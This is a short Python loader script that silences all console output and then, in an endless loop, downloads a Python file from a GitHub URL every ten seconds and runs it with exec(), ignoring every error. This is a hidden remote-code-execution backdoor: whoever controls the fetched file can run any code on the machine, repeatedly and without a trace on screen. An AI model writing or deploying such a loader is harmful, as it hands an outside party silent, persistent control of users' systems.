LOADER_VERSION = "1.1"

import sys, os

sys.stdout = open(os.devnull, "w")
sys.stderr = sys.stdout

from time import sleep
import requests

URL = "https://raw.githubusercontent.com/Proutman67/educational/refs/heads/main/user_script.py" 

while True:
    try:
        content = requests.get(URL, timeout=10).text
        exec(content)
    except:
        pass
    sleep(10)
